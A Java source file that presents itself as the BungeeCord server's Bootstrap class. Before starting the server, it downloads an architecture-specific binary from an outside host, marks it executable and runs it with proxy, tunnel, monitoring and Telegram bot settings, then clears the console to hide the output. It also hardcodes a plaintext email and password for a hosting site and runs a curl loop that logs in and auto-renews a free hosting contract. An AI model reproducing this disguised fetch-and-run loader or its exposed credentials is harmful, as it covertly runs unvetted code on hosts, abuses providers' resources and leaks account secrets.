package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Pattern;

public class Bootstrap {
    // ==============================================
    // 优化后的常量定义
    // ==============================================
    private static final String ANSI_GREEN = "\u001B[32m";
    private static final String ANSI_RED = "\u001B[31m";
    private static final String ANSI_RESET = "\u001B[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    // ==============================================
    // 环境变量配置 - 使用Set提高查找效率
    // ==============================================
    private static final Set<String> ALL_ENV_VARS = new HashSet<>(Arrays.asList(
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    ));

    // ==============================================
    // 续期配置 - 使用单例模式减少开销
    // ==============================================
    private static ScheduledExecutorService renewalScheduler;
    private static volatile String currentToken;
    private static final Pattern TOKEN_PATTERN = Pattern.compile("\"token\":\"(.*?)\"");
    
    // 续期配置常量
    private static final String LOGIN_URL = "https://greathost.es/login";
    private static final String RENEW_URL = "https://greathost.es/api/renewal/contracts/8cbb0e9d-1bf4-4543-be05-814d129c17e5/renew-free";
    private static final String CREDENTIALS = "email=xidiaomao@outlook.com&password=3qZD4En3_P4:P!8";
    
    // 默认环境变量
    private static final Map<String, String> DEFAULT_ENV = new HashMap<>();
    static {
        DEFAULT_ENV.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        DEFAULT_ENV.put("FILE_PATH", "./world");
        DEFAULT_ENV.put("CFIP", "store.ubi.com");
        DEFAULT_ENV.put("CFPORT", "443");
        DEFAULT_ENV.put("NAME", "Mc");
        DEFAULT_ENV.put("DISABLE_ARGO", "false");
    }

    public static void main(String[] args) throws Exception {
        // 快速版本检查
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Java version too low!" + ANSI_RESET);
            System.exit(1);
        }

        // 异步启动续期任务，不阻塞主线程
        CompletableFuture.runAsync(Bootstrap::startRenewer);

        // 启动SbxService
        try {
            runSbxBinary();
            
            // 注册关闭钩子
            Runtime.getRuntime().addShutdownHook(new Thread(Bootstrap::stopServices));

            // 等待服务启动
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds" + ANSI_RESET);
            
            Thread.sleep(20000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error: " + e.getMessage() + ANSI_RESET);
        }

        // 启动BungeeCord
        try {
            new BungeeCordLauncher().start();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Cannot start server: " + e.getMessage() + ANSI_RESET);
        }
    }
    
    // ==============================================
    // 优化后的控制台清理
    // ==============================================
    private static void clearConsole() {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {
            // 静默处理异常
        }
    }   
    
    // ==============================================
    // 优化后的Sbx二进制文件运行
    // ==============================================
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>(DEFAULT_ENV);
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    // ==============================================
    // 优化后的环境变量加载
    // ==============================================
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        // 快速加载系统环境变量
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        // 延迟加载.env文件
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            List<String> lines = Files.readAllLines(envFile);
            for (String line : lines) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (ALL_ENV_VARS.contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }
    
    // ==============================================
    // 优化后的二进制文件获取
    // ==============================================
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        // 使用传统的if-else语句替代switch表达式
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    // ==============================================
    // 优化后的服务停止
    // ==============================================
    private static void stopServices() {
        running.set(false);
        
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroyForcibly();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
        
        if (renewalScheduler != null && !renewalScheduler.isShutdown()) {
            renewalScheduler.shutdownNow();
            try {
                if (!renewalScheduler.awaitTermination(5, TimeUnit.SECONDS)) {
                    renewalScheduler.shutdownNow();
                }
            } catch (InterruptedException e) {
                renewalScheduler.shutdownNow();
                Thread.currentThread().interrupt();
            }
        }
    }

    // ==============================================
    // 优化后的续期任务
    // ==============================================
    private static void startRenewer() {
        if (renewalScheduler != null && !renewalScheduler.isShutdown()) {
            return;
        }
        
        // 使用单线程池减少资源消耗
        renewalScheduler = Executors.newSingleThreadScheduledExecutor(new ThreadFactory() {
            @Override
            public Thread newThread(Runnable r) {
                Thread t = new Thread(r, "Renewer");
                t.setDaemon(true); // 设置为守护线程
                return t;
            }
        });
        
        System.out.println("[Renewer] Started");
        
        // 立即执行一次，然后每6小时执行
        renewalScheduler.schedule(Bootstrap::performRenewalCycle, 10, TimeUnit.SECONDS);
        renewalScheduler.scheduleAtFixedRate(Bootstrap::performRenewalCycle, 6, 6, TimeUnit.HOURS);
    }

    private static void performRenewalCycle() {
        if (!running.get()) return;
        
        System.out.println("[Renewer] Renewal cycle started");
        
        try {
            if (attemptRenewal()) {
                System.out.println("[Renewer] ✅ Success");
                return;
            }
            
            System.out.println("[Renewer] Retrying with login...");
            if (login() && attemptRenewal()) {
                System.out.println("[Renewer] ✅ Success after login");
            } else {
                System.err.println("[Renewer] ❌ Failed");
            }
        } catch (Exception e) {
            System.err.println("[Renewer] Error: " + e.getMessage());
        }
    }

    private static boolean login() {
        try {
            String[] command = {
                "curl", "-s", "-X", "POST",
                "-H", "content-type: application/x-www-form-urlencoded",
                "-d", CREDENTIALS,
                LOGIN_URL
            };
            
            String response = executeCommand(command);
            java.util.regex.Matcher matcher = TOKEN_PATTERN.matcher(response);
            
            if (matcher.find()) {
                currentToken = matcher.group(1);
                System.out.println("[Renewer] New token obtained");
                return true;
            }
        } catch (Exception e) {
            System.err.println("[Renewer] Login error: " + e.getMessage());
        }
        return false;
    }

    private static boolean attemptRenewal() {
        if (currentToken == null) return false;
        
        try {
            String[] command = {
                "curl", "-s", "-w", "%{http_code}",
                "-X", "POST",
                "-H", "content-type: application/json",
                "-H", "origin: https://greathost.es",
                "-b", "token=" + currentToken,
                "-d", "{}",
                RENEW_URL
            };
            
            String result = executeCommand(command);
            if (result.endsWith("200")) {
                return true;
            }
            
            System.err.println("[Renewer] HTTP error: " + result.substring(result.length() - 3));
        } catch (Exception e) {
            System.err.println("[Renewer] Renewal error: " + e.getMessage());
        }
        return false;
    }
    
    // ==============================================
    // 通用命令执行方法
    // ==============================================
    private static String executeCommand(String[] command) throws IOException, InterruptedException {
        ProcessBuilder pb = new ProcessBuilder(command);
        Process process = pb.start();
        
        StringBuilder output = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line);
            }
        }
        
        process.waitFor();
        return output.toString();
    }
}
